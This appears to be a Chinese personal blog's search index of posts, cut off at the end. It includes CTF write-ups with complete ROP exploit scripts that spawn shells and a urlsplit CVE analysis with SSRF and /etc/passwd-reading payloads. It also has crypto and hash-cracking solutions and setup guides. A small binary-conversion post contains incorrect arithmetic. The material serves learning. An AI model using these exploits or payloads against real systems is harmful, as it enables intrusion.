<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【CTF-PWN】ROPEmporium]]></title>
    <url>%2F2020%2F05%2F28%2F14-CTF-PWN-ROPEmporiumWriteUP%2F</url>
    <content type="text"><![CDATA[记录一下学习ROP的基础题目. ret2win 32位:先分析一下程序, 可以看到main、pwnme、ret2win函数.main函数调用了pwnme函数, pwnme函数里面存在一个gets读取0x32个字节到s变量里面, 但是这个变量只有0x28大小. 也就是0x28 + 4 + retaddr就可以控制这个程序的返回地址了. 废话不多说 直接上exp. from pwn import * p = process("./ret2win32") # var overflow = 0x28 + 4 ret2win_addr = 0x08048659 payload = "A" * overflow payload += p32(ret2win_addr) p.sendline(payload) p.interactive() 64位:虽然是64位的, 但是这个题目不需要进行rop, 所以和32位的做法一样. from pwn import * p = process("./ret2win") # var overflow = 0x20 + 8 # because is 64 bit program, +8 ret2win_addr = 0x0000000000400811 payload = "A" * overflow payload += p64(ret2win_addr) p.sendline(payload) p.interactive() split32位:main、pwnme函数都和上道题差不多, 但是usefulFunction里面只有一条system(&quot;/bin/ls&quot;), 并不是cat /flag, 不过可以通过IDA里面shift+F12, 搜索到/bin/cat flag.txt, 也就是system函数和/bin/cat flag.txt并不在连续的内存位置, 所以需要构造一下 :D 接下来就要用到汇编中, 调用函数的原理. 如果不懂的可以看我之前拍过的一期视频.【x86汇编】详解汇编调用函数三步，加恢复堆栈平衡 开始写exp from pwn import * p = process("./split32") elf = ELF("./split32") # var overflow = 0x28 + 4 system_addr = elf.plt["system"] cat_flag_addr = 0x0804A030 payload = "A" * overflow payload += p32(system_addr) + p32(0) payload += p32(cat_flag_addr) p.sendline(payload) p.interactive() 64位:64位调用函数参数寄存器: rdi, rsi, rdx, rcx, r8, r9从这里开始, 我们第一次接触gadget, 什么是gadget呢, 就是程序中存在的一些小汇编指令,比如pop rdi; ret, pop rsi; ret, mov r12, 13; ret, 有没有发现什么规律, 每个汇编指令结尾都是ret, 所以是ROP Return-Oriented Programming, 可以通过找到多个gadget, 最后组成一段长的链, 以完成我们的攻击. 在我们安装完毕pwntools之后, 会有一个工具ROPgadget, 它可以很方便的找到我们攻击所需要的gadget. 64位程序调用函数的时候, 函数的前6个参数是存在于寄存器当中的, 所以我们需要把/bin/cat flag.txt放到第一个参数的位置, 也就是需要找到pop rdi; ret 找pop rdi; ret ROPgadget --binary split --only "pop|ret" 可以找到0x0000000000400883 : pop rdi ; ret, 已经可以开始写exp了. from pwn import * p = process("./split") elf = ELF("./split") # var overflow = 0x20 + 8 pop_rdi_addr = 0x0000000000400883 cat_flag_addr = 0x0000000000601060 system_addr = elf.plt["system"] payload = "A" * overflow payload += p64(pop_rdi_addr) + p64(cat_flag_addr) payload += p64(system_addr) p.sendline(payload) p.interactive() callme32位:这道题目是为了加深函数调用的理解题目说需要依次调用callme_one(), callme_two() , callme_three()三个函数, 每个函数都需要传递1 2 3三个参数. 也就是func(1, 2, 3) 需要通过ROPgadget找到一个可以删除栈上三个参数的gadget, 以恢复栈平衡. 要注意, callme_one, callme_two等函数地址要取函数本身的, 而不是call callme_one之类的地址. 开始写exp from pwn import * p = process("./callme32") elf = ELF("./callme32") # var overflow = 0x28 + 4 callme_one_addr = elf.sym["callme_one"] callme_two_addr = elf.sym["callme_two"] callme_three_addr = elf.sym["callme_three"] pop_esi_rdi_rbp_ret = 0x080488a9 payload = "A" * overflow payload += p32(callme_one_addr) + p32(pop_esi_rdi_rbp_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_two_addr) + p32(pop_esi_rdi_rbp_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_three_addr) + p32(pop_esi_rdi_rbp_ret) + p32(1) + p32(2) + p32(3) p.sendline(payload) p.interactive() 64位:emm, 这个题目, 64位个人感觉要更简单一些, 专心找gadget就可以了. from pwn import * p = process("./callme") elf = ELF("./callme") # var overflow = 0x20 + 8 callme_one_addr = elf.sym["callme_one"] callme_two_addr = elf.sym["callme_two"] callme_three_addr = elf.sym["callme_three"] pop_rdi_rsi_rdx_addr = 0x0000000000401ab0 payload = "A" * overflow payload += p64(pop_rdi_rsi_rdx_addr) + p64(1) + p64(2) + p64(3) + p64(callme_one_addr) payload += p64(pop_rdi_rsi_rdx_addr) + p64(1) + p64(2) + p64(3) + p64(callme_two_addr) payload += p64(pop_rdi_rsi_rdx_addr) + p64(1) + p64(2) + p64(3) + p64(callme_three_addr) p.sendline(payload) p.interactive() write432位:这个挑战给了system但是没有给/bin/cat flag.txt, 则需要自己写一段进去, 这里打算直接写个/bin/sh, 但是往哪里写呢？ 通过readelf工具查看段. 可以看到.data和.bss段都有可读写的权限, 这里就可以把/bin/sh写到.data段内, 要写入的长度是7, data段大小是8, 刚好可以装下. 要想写入数据到里面, 需要使用mov指令, 于是找到了 0x080486da : pop edi ; pop ebp ; ret 0x08048670 : mov dword ptr [edi], ebp ; ret这两条指令就可以满足我们写入数据到内存的想法. 由于这是32位的程序, 每次只能写入4个字节, 而/bin/sh是7个字节, 于是我们要分两次进行写入。 那? Go? from pwn import * p = process("./write432") elf = ELF("./write432") # var overflow = 0x28 + 4 system_addr = elf.plt["system"] data_addr = 0x0804a028 pop_edi_ebp_addr = 0x080486da mov_edi_ebp = 0x08048670 bin_sh_str = "/bin/sh".ljust(8, "\0") left_bin_sh = bin_sh_str[:4] right_bin_sh = bin_sh_str[4:] payload = "A" * overflow payload += p32(pop_edi_ebp_addr) + p32(data_addr) + left_bin_sh + p32(mov_edi_ebp) payload += p32(pop_edi_ebp_addr) + p32(data_addr + 4) + right_bin_sh + p32(mov_edi_ebp) payload += p32(system_addr) + p32(0) payload += p32(data_addr) p.sendline(payload) p.interactive() 64位:思路和32位一样, 不过64位要更简单一些, 因为可以一次性直接把/bin/sh写进去, 不用分开写入了. 找到需要的gadget 0x0000000000400893 : pop rdi ; ret 0x0000000000400890 : pop r14 ; pop r15 ; ret 0x0000000000400820 : mov qword ptr [r14], r15 ; ret开始编写exp from pwn import * p = process("./write4") elf = ELF("./write4") # var overflow = 0x20 + 8 system_addr = elf.plt["system"] pop_rdi_addr = 0x0000000000400893 data_addr = 0x0000000000601050 mov_r14_r15_addr = 0x0000000000400820 pop_r14_15_addr = 0x0000000000400890 bin_sh_str = "/bin/sh".ljust(8, "\0") payload = "A" * overflow payload += p64(pop_r14_15_addr) + p64(data_addr) + bin_sh_str + p64(mov_r14_r15_addr) payload += p64(pop_rdi_addr) + p64(data_addr) payload += p64(system_addr) p.sendline(payload) p.interactive() badchars32位:程序禁止输入b i c / &lt;space&gt; f n s, 可以通过异或后的结果来把/bin/sh写到程序, 再通过gadget把/bin/sh异或回来, 再进行执行. 首先要得出异或哪个数字可以通过这个黑名单, 写个脚本跑跑. blackList = [ord(i) for i in ["b", "i", "c", "/", " ", "f", "n", "s"]] bin_sh = "/bin/sh".ljust(8, "\0") result = "" # 测试从1异或到20 看看哪个数字可以使用 for i in range(1, 20): for item in bin_sh: if ord(item) ^ i in blackList: break else: result += item if len(result) == 8: print(i) result = "" 执行完毕可以发现2 3 5 9 18 19之类的都可以用, 然后直接用个最小的就可以. 开始编写exp from pwn import * p = process("./badchars32") elf = ELF("./badchars32") overflow = cyclic_find("laaa") xor_num = 2 bin_sh = list("/bin/sh".ljust(8, "\0")) data_addr = 0x0804a038 system_addr = elf.sym["system"] mov_edi_esi_ret = 0x08048893 pop_esi_edi_ret = 0x08048899 pop_ebx_ecx_ret = 0x08048896 xor_ebx_ecx_ret = 0x08048890 # xor encode for index, item in enumerate(bin_sh): bin_sh[index] = chr(ord(item) ^ xor_num) bin_sh = "".join(bin_sh) payload = "A" * overflow # write "/bin" to data payload += p32(pop_esi_edi_ret) + bin_sh[:4] + p32(data_addr) payload += p32(mov_edi_esi_ret) # write "/sh" to data payload += p32(pop_esi_edi_ret) + bin_sh[4:] + p32(data_addr + 4) payload += p32(mov_edi_esi_ret) # decode xor for i in range(len(bin_sh)): payload += p32(pop_ebx_ecx_ret) + p32(data_addr + i) + p32(xor_num) payload += p32(xor_ebx_ecx_ret) # system(/bin/sh) payload += p32(system_addr) payload += p32(0) payload += p32(data_addr) p.sendline(payload) p.interactive() 64位:和32位一样思路, 只是找到gadget不一样, 还要注意要比32位程序多用一个pop rdi; ret. exp: from pwn import * p = process("./badchars") xor_num = 2 binsh = '/bin/sh\x00' xorbinsh = '' for i in binsh: a = ord(i) ^ xor_num xorbinsh += chr(a) overflow = cyclic_find("kaaa") pop_rdi_ret = 0x0000000000400b39 pop_r12_r13_ret = 0x0000000000400b3b mov_r13_r12_ret = 0x0000000000400b34 pop_r14_r15_ret = 0x0000000000400b40 xor_r15_r14_ret = 0x0000000000400b30 bss_addr = 0x601080 system_addr = 0x4006f0 payload = "A" * overflow payload += p64(pop_r12_r13_ret) + xorbinsh + p64(bss_addr) payload += p64(mov_r13_r12_ret) for i in range(len(xorbinsh)): payload += p64(pop_r14_r15_ret) payload += p64(xor_num) payload += p64(bss_addr + i) payload += p64(xor_r15_r14_ret) payload += p64(pop_rdi_ret) payload += p64(bss_addr) payload += p64(system_addr) p.sendline(payload) p.interactive() fluff32位:看介绍, 就是write4的升级版, 肯定是要找一条可以把寄存器的值写入到内存地址上的指令, 0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret但是没找到pop ecx; pop edx; ret之类的操作 可是…可以发现一条 0x080485f3 : popal ; cld ; ret第一次遇到这个指令, 去搜了一下, 可以从栈上弹到所有寄存器,顺序是%edi-&gt;%esi-&gt;%ebp-&gt;%esp-&gt;%ebx-&gt;%edx-&gt;%ecx-&gt;%eax也就是相当于 pop edi; pop esi; pop ebp; pop esp; pop ebx; pop edx; pop ecx; pop eax;这样我们只需要随便填充其他的寄存器, 然后把ecx, edx寄存器填写成我们需要的内容就可以了. 为了减少代码量, 我们还可以写个函数. 直接上exp from pwn import * p = process("./fluff32") # var offset = 44 bss_addr = 0x0804a040 bin_sh = "/bin/sh".ljust(8, "\0") system_addr = 0x0804865A popal = 0x080485f3 # %edi->%esi->%ebp->%esp->%ebx->%edx->%ecx->%eax mov_ecx_edx = 0x08048693 # 2 mov [ecx], edx def write(text, offset): payload = p32(popal) payload += p32(0) payload += p32(0) payload += p32(0) payload += p32(0) payload += p32(0) payload += text # edx payload += p32(bss_addr + offset) # ecx payload += p32(0) payload += p32(mov_ecx_edx) + p32(0) + p32(0) return payload payload = "A" * offset payload += write(bin_sh[:4], 0) payload += write(bin_sh[4:], 4) payload += p32(system_addr) + p32(bss_addr) p.sendline(payload) p.interactive() 64位:只要搞明白, 0 与 正数进行异或, 得到的结果就是那个正数, 可以通过这个方法间接给一个寄存器赋值. from pwn import * p = process("./fluff") # var offset = 0x28 system_addr = 0x4005E0 bss_addr = 0x0000000000601060 pop_rdi = 0x00000000004008c3 # pop rdi; ret xor_r11_r11 = 0x0000000000400822 # xor r11, r11; pop; ? ret pop_r12 = 0x0000000000400832 # pop r12 ; ?; ret xor_r11_r12 = 0x000000000040082F # xor r11, r12; pop; ?; ret mov_r10_r11 = 0x000000000040084E # mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret xchg_r10_r11 = 0x0000000000400840 # xchg; pop; ?; ret bin_sh = "/bin/sh".ljust(8, "\0") # A == 0 -> A ^= ? -> A = ? """ >>> r11 = 100 >>> r11 ^= r11 >>> r11 0 >>> r12 = 200 >>> r11 ^= r12 >>> r11 200 """ payload = "A" * offset # bin/sh -> bss payload += p64(xor_r11_r11) + p64(0) # r11 = 0 payload += p64(pop_r12) + p64(bss_addr) # r12 = bss_addr payload += p64(xor_r11_r12) + p64(0) # r11 = r12 = bss_addr payload += p64(xchg_r10_r11) + p64(0) # r10 = 0 -> r10 = r11 = r12 = bss_addr payload += p64(xor_r11_r11) + p64(0) # r11 = 0 payload += p64(pop_r12) + bin_sh # r12 = /bin/sh payload += p64(xor_r11_r12) + p64(0) # r11 = 0 -> r11 = r12 = /bin/sh payload += p64(mov_r10_r11) + p64(0) + p64(0) # mov [bss], /bin/sh payload += p64(pop_rdi) + p64(bss_addr) # bss_addr = /bin/sh payload += p64(system_addr) # system(bss_addr) = system(/bin/sh) p.sendline(payload) p.interactive() pivot待补充… ret2csu待补充…]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 3.7.2 urllib.parse.urlsplit 漏洞分析]]></title>
    <url>%2F2020%2F05%2F27%2F13-Python-3-7-2-urlsplit-cve%2F</url>
    <content type="text"><![CDATA[Python 3.7.2的urllib.parse模块下urlsplit错误的处理字符导致漏洞。 漏洞原理用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 URL。 例如，在直接比较中, \uFF03不等于＃，而是统一化为＃，这会更改 URL 的片段部分。 类似地，\u2100 统一化为a/c，它引入了路径段。 ℅解析为c/o℆解析为c/u CTF例子[SUCTF 2019]Pythonginx题目链接: Pythonginx这个题目通过构造℆ 使其构造为?url=file://suctf.c℅pt/../etc/passwd, 以此解析成suctf.cc/opt/../etc/passwd, 就可以看到/etc/passwd的内容. [SharkyCTF]Aqua World题目链接: Aqua World这个题目需要以本地的地址访问到这个网站, 题目也提示了要使urlsplit后的netloc为本地地址, 然后通过F12查看服务器的Python版本是3.7.2 这个网站存在一个anonymous的登录, 尝试分割这个url, 参考CVE-2019-9636, 可以得到 继续参考, 可以看到一个例子: >>> u = "https://example.com\uFF03@bing.com" >>> urlsplit(u).netloc.rpartition("@")[2] bing.com 于是我们尝试http://anonymous:anonymous@aquaworld.sharkyctf.xyz/admin-query?flag=flag根据上面的例子进行更改, 为 http://anonymous:anonymous@aquaworld.sharkyctf.xyz/admin-query\uFF03@localhost?flag=flag 发送payload! 可以看到netloc已经被更改了, 但是没有得到flag, 于是更改payload的localhost为127.0.0.1, 再次进行尝试. 修复官方解决办法是, 遇到这几个特殊字符直接抛出Value Error 参考资料CVE-2019-9636：urlsplit 不处理 NFKC 标准化 CVE-2019-10160：urlsplit NFKD 标准化漏洞]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>CVE</tag>
        <tag>URLSPLIT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020网鼎杯 安卓逆向 bang]]></title>
    <url>%2F2020%2F05%2F11%2F12-wangdingCUP-bang-reverse%2F</url>
    <content type="text"><![CDATA[参加了一下网鼎杯, 太难了…QAQ, 赛后根据大佬的思路重新做了一遍题目, 记录一下… Setup Python3 Jadx-GUI Frida (python -m pip install frida-tools) Frida-server Frida-DEXDump ADB 安卓模拟器(推荐夜神安卓模拟器) Go?0x01将题目先安装进模拟器, 然后运行起来. 0x02将adb连接到模拟器, adb connect 127.0.0.1:62001, 看到success就代表连接成功了. 0x03将适合自己模拟器系统的frida-server放入模拟器里.把下载的frida-server也就是frida-server-12.8.20-android-x86.xz,解压成为frida-server-12.8.20-android-x86(因为我的夜神模拟器里是x86架构的.) 可以如下命令查看手机版本 adb shell getprop ro.product.cpu.abi将解压后的文件push到手机里面、加执行权限、并运行。 adb push frida-server-12.8.20-android-x86 /data/local/tmp/frida-server adb shell cd /data/local/tmp chmod 775 frida-server ./frida-server 之后再开一个cmd窗口, 将端口转发到本机 adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:270430x04检查是否成功 frida-ps -U 如果你和我一样, 那么恭喜. 0x05这时找到Frida-DEXDump, 运行python main.py就dump出了想要的内容. 再使用JADX-GUI, 打开得到的.dex文件, 就可以看到. 还是太菜了…]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Android</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang 垃圾回收剖析]]></title>
    <url>%2F2020%2F03%2F10%2F11-Golang-Gc%2F</url>
    <content type="text"><![CDATA[这一小节介绍三种经典的 GC 算法：引用计数（reference counting）、标记-清扫（mark &amp; sweep）、节点复制（Copying Garbage Collection），分代收集（Generational Garbage Collection）。 直接看大佬的文章, 讲的超级超级详细！！！Golang 垃圾回收剖析Golang 垃圾回收剖析Golang 垃圾回收剖析]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>Gc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ElasticSearch Centos7安装教程]]></title>
    <url>%2F2020%2F02%2F14%2F10-ElasticSearch-Quick-Start%2F</url>
    <content type="text"><![CDATA[ElasticSearch是一个采用Java语言编写搜索服务器，提供了一个分布式多用户的全文搜索引擎，能够达到实时搜索，稳定，可靠，快速，安装使用方便。 环境说明Centos7必须能连接互联网 [root@localhost ~]# cat /etc/redhat-release CentOS Linux release 7.7.1908 (Core) Xshell用来连接Centos主机. 没有的话直接用系统自带的SSH也可以。 安装ElasticSearch前置任务 (雾)由于es不支持以root用户运行，所以需要创建一个普通用户 [root@localhost ~]# useradd elasticuser 在自己喜欢的目录创建一个es的下载文件夹. 我选择/usr/es [root@localhost ~]# mkdir -p /usr/es 因为是用root用户创建的文件夹, elasticuser用户没有权限，所以要更改文件夹的权限 [root@localhost usr]# chown elasticuser:elasticuser es/ -R 切换成elasticuser用户进行下面的操作 [root@localhost usr]# su elasticuser [elasticuser@localhost usr]$ whoami elasticuser 准备任务 (大雾)下载es [elasticuser@localhost usr]$ cd es [elasticuser@localhost es]$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.6.0-linux-x86_64.tar.gz 解压 [elasticuser@localhost es]$ ls elasticsearch-7.6.0-linux-x86_64.tar.gz [elasticuser@localhost es]$ tar zxvf elasticsearch-7.6.0-linux-x86_64.tar.gz 修改配置文件 config/jvm.options (非必须, 目的是调整内存占用少一些) -Xms512m -Xmx512m config/elasticsearch.yml (重要, 调整不好会导致ElasticSearch启动失败) 不要直接复制粘贴, yml格式不允许写注释. network.host: 0.0.0.0 // 修改完毕后可以外网访问 cluster.name: "centos-cluster" // 不改就启动起来提示Warning node.name: "node-1" // 不改就启动起来提示Warning discovery.seed_hosts: ["127.0.0.1", "[::1]"] // 不改就启动起来提示Warning cluster.initial_master_nodes: ["node-1"] // 不改就启动起来提示Warning 尝试启动ElasticSearch. [elasticuser@localhost elasticsearch-7.6.0]$ ./bin/elasticsearch 不失众望的报错了, 查看一下报错: 解决错误 ([1])遇到错误不慌， 一个个解决，首先是第一个 [1]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535] 更改/etc/security/limits.conf, 这个时候要使用root用户更改, 写入以下内容 * soft nofile 65535 * hard nofile 65535写完是这样的 接着重启一下服务器. 继续解决下一个bug. 解决错误 ([2])重启完， 先看看第一个错误解决了没有 [root@localhost ~]# ulimit -Hn 65535 [root@localhost ~]# ulimit -Sn 65535 发现两个返回都是65535，就证明修改生效了。 然后看下一个报错 [2]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144] 修改/etc/sysctl.conf， 添加 vm.max_map_count=262144 保存退出 并 执行 [root@localhost bin]# sysctl -p vm.max_map_count = 262144 再切换成elasticuser用户, 去运行es. 可以看到运行成功了, 使用浏览器去访问http://&lt;centos的IP地址&gt;:9200 emm 无法访问… 因为Centos默认开启了防火墙. 可以直接关闭防火墙 (启停服务需要root用户) [root@localhost bin]$ systemctl stop firewalld.service 再重新运行es. ok, 安装完毕, 接下来就可以正常学习和使用ElasticSearch了。 就这样！]]></content>
      <categories>
        <category>Linux</category>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ES</tag>
        <tag>ElasticSearch</tag>
        <tag>Centos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下配置Flutter运行开发环境]]></title>
    <url>%2F2019%2F12%2F19%2F9-Windows-Set-FlutterDev%2F</url>
    <content type="text"><![CDATA[Windows下设置Flutter的运行开发环境. 说实话, 看到移动平台的开发就觉得很麻烦，还好这次Flutter没让我太过于失望。 下载必要的软件 GIt For Windows Git工具, 在windows下的客户端. Java Java JDK8 Android Studio 是为了安装SDK. Flutter 肯定是下载最新版本啦. VS Code 超级轻量的代码编辑器 设置环境变量Java设置环境变量将JDK的安装目录放入环境变量 key: JAVA_HOME value: D:\Software\Java\jdk1.8.0_231 看个人情况. Flutter设置环境变量将下载的Flutter SDK解压, 放入没有中文，没有空格的目录下, 设置环境变量将Flutter放入系统变量key: FLUTTER_HOME value: D:\LearningMaterials\flutter然后设置PATH: %FLUTTER_HOME%\bin 即可. VSCode安装插件 Dart Flutter 检查运行环境doctorcmd下运行flutter doctor会自动诊断当前的环境是否有异常 emulatorscmd下运行flutter emulators会列出当前可用的Android和IOS设备.通过运行flutter emulators --launch &lt;emulator id&gt;指定列出的设备名, 即可打开设备. runcmd在代码根目录运行flutter run即可在运行的设备中打开APP, 不过第一次可能会出现未license的错误, 可以运行flutter doctor --android-licenses, 根据提示全部按y, 结束后再次flutter run即可成功运行. 学习…学习…]]></content>
      <categories>
        <category>Flutter</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Flutter</tag>
        <tag>Windows</tag>
        <tag>IOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF 密码学思路WriteUP]]></title>
    <url>%2F2019%2F12%2F03%2F8-BUUCTF-Crypto-WriteUP%2F</url>
    <content type="text"><![CDATA[BUUCTF, 自己学习的过程中思路记录, 以及flag… (目的是记录自己的思路和想法！！！) 题目地址: BUUCTF MD5直接拿去SOMD5解密flag{admin1} 看我回旋踢ROT13解密, 直接在线工具.flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1} Url编码用Hackbar之类的工具进行URL解码flag{and 1=1} 摩丝这可不是丝wa… 用工具直接解摩斯电码吧.工具: 摩尔斯电码解密flag{iloveyou} 一眼就解密打开F12, 在Console中输入 atob("ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=") flag{THE_FLAG_OF_THIS_STRING} 变异凯撒没思路先写脚本穷举, 发现从ascii+5开始依次出现flag关键字, 于是写脚本进行解密. cipher = "afZ_r9VYfScOeO_UL^RWUc" index = 0 for num in range(5, len(cipher) + 5): temp = "" for i in cipher: temp += chr(ord(i) + num) print(temp[index], end="") index += 1 flag{Caesar_variation} Quoted-printable工具题，没意义，也没难度，知道有这种编码就会解.在线工具flag{那你也很棒哦} password社工题目, 之前做过类似的, 知道规律就行, 没什么难度. (别问为什么, 这就是CTF)flag{zs19900315} zip伪加密感觉不应该是密码学, 应该是Misc题目.使用WinHex把压缩包打开, 将Hex的, 50 4B 03 04 14 00 09 00改成50 4B 03 04 14 00 00 00, 保存再去解压, 就会发现可以正常解压了.flag{Adm1N-B2G-kU-SZIP} RSA稍微了解一下RSA加密算法就知道d怎么求了, 直接上py脚本. import libnum p = 473398607161 q = 4511491 e = 17 print(libnum.invmod(e, (p - 1) * (q - 1))) flag{125631357777427553} Rabbit看题目就知道是什么加密, 直接找在线工具.flag{Cute_Rabbit} 丢失的MD5给了一个Python脚本, 脚本是Python2的, 直接运行得到Flag. (目的是了解MD5爆破)flag{e9032994dabac08080091151380478a2} 篱笆墙的影子栅栏密码, 选择2栏, 进行加密操作, flag直接出. (注意是加密, 不是解密)flag{wethinkwehavetheflag} Alice与Bob通过在线工具进行质因数分解, 得到两个素数, 根据题目, 将小素数放在前面, 大素数放在后面, 拼接, 进行md5 32位的加密.flag{d450209323a847c8d01c6be47c81811a} rsarsa需要了解RSA的加密过程, 才会知道解密过程, 背脚本是没有意义的。建议去看看RSA原理, 推荐几个我看过的教程.RSA-1RSA-2 看完上面两个绝对会RSA基础题目解密了.上Python脚本!! import libnum p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 d = libnum.invmod(e, (p-1)*(q-1)) result = pow(c, d, p*q) print(result) flag{5577446633554466577768879988} 传统知识+古典密码？这什么沙雕题目，如果看不懂辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳， +甲子就GG.得出: XZSDMFLZ然后进行古典密码解密, 先4栏栅栏, 再偏移21位凯撒, 即可得出FLagflag{SHUANGYU} 大帝的密码武器说实话, 这个题目一开始我没怎么看明白, 后来找到规律就好办了.先将FRPHEVGL进行ASCII爆破, 看题目说会出现有意义的单词, 就每次爆破的时候, ASCII大于z的时候， 将当前字母的ASCII码进行-26操作, 爆破发现13是有意义SECURITY的, 直接上脚本. cipher = "FRPHEVGL" # 已知的密文 result = "SECURITY" # 第一步找到的有意义单词 secert = 13 # 第二步找到的有意义偏移量 t = "ComeChina" # 需要解密的密文 # 1. 爆破具体是位移多少位才是有意义的. for i in range(26): for j in cipher: temp = ord(j) + i if temp > ord("Z"): temp -= 26 print(chr(temp), end="") print() # 2. 找规律, 发现都是根据13来的. temp = [] for i, j in zip(cipher, result): i = ord(i) j = ord(j) if i > j: temp.append(j - i) else: temp.append(j - i) print(temp) # 3. 根据题目规律爆破, 超过z就-26, 即可得到Flag for i in t: t = ord(i) + secert if t > ord("z"): t -= 26 print(chr(t), end="") flag{PbzrPuvan} Windows系统密码下载下来附件拿去Kali使用John工具进行解密. john pass.hash john --show --format=LM pass.hash 有点坑, 要小写.flag{good-luck} RSA1已知dp,dq求解: 题目给了dp, dq, 需要去了解一下dp,dq是什么, 然后直接脚本做题. import libnum import binascii def decrypt(dp,dq,p,q,c): InvQ = libnum.invmod(q,p) mp = pow(c,dp,p) mq = pow(c,dq,q) m=(((mp-mq)*InvQ)%p)*q+mq print (binascii.unhexlify(hex(m)[2:])) flag{W31c0m3_70_Ch1n470wn} RSA3题目给了两个c, 两个e, 一个n, 典型的RSA共模攻击, 直接一把梭. import libnum import binascii def RSACommonMode(n, c1, c2, e1, e2): def egcd(a, b): if b == 0: return a, 0 else: x, y = egcd(b, a % b) return y, x - (a // b) * y s = egcd(e1, e2) s1 = s[0] s2 = s[1] if s1 &lt; 0: s1 = - s1 c1 = libnum.invmod(c1, n) elif s2 &lt; 0: s2 = - s2 c2 = libnum.invmod(c2, n) m = pow(c1, s1, n) * pow(c2, s2, n) % n print(binascii.unhexlify(hex(m)[2:])) flag{49d91077a1abcb14f1a9d546c80be9ef} 凯撒？替换？呵呵!一堆看不懂的乱码, 扔去quipqiup进行字符频率统计, 就可以得到flag了. 大坑, 空格要删除掉.flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake} 先到这里吧. 以后慢慢补充.]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>BUUCTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手算正反十进制转换二进制过程]]></title>
    <url>%2F2019%2F10%2F28%2F7-Dec-to-Bin-Calc%2F</url>
    <content type="text"><![CDATA[学习一下手算十进制到二进制, 包括正数和负数转换二进制. 十进制正数 转换 二进制 除以2的整数结果除以2到0为止. 结果从下往上看. Example: 把9计算成2进制. 9 9/2 = 4 -&gt; 1 ; 9/2=4.5 把小数点忽略, 就是4, 因为有小数点, 所以这个位置就是1. 4/2 = 2 -&gt; 0 ; 4/2=2 没有小数点, 这个位置就是0. 2/2 = 1 -&gt; 0 ; 结果等于1的时候还要进行除. 1/2 = 0 -&gt; 1 ; 结果为0的时候才能结束, 1/2=0.5, 有余数, 所以为1. 从下向上看, 排序1001, 这个计算的结果从上到下和从下到上都一样... Example: 把27计算2进制. 27 27/2 = 13 -&gt; 1 13/2 = 6 -&gt; 1 6/2 = 3 -&gt; 0 3/2 = 1 -&gt; 1 1/2 = 0 -&gt; 1 结果是: 0001 1011 十进制负数 转换 二进制 计算负数绝对值的二进制结果. 将第一步计算的结果进行取反. 取反后+1, 就是最终结果 64位的, 计算的内容前面填充1. Example: 把-9转换二进制9 9/2 4 1 4/2 2 0 2/2 1 0 1/2 0 1 源码: 1001反码: 0110补码: 反码 + 1 : 0111 结果: 0111 - Example: 把-15转换二进制1515/2 7 17/2 3 13/2 1 11/2 0 1 源码: 1111反码: 0000补码: 0001 结果: 0001``` 其他数计算都是这个步骤, 去尝试一下吧~]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>进制转换</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nim编程语言快速入门 (附代码例子)]]></title>
    <url>%2F2019%2F10%2F03%2F6-Nim-Programming-Language%2F</url>
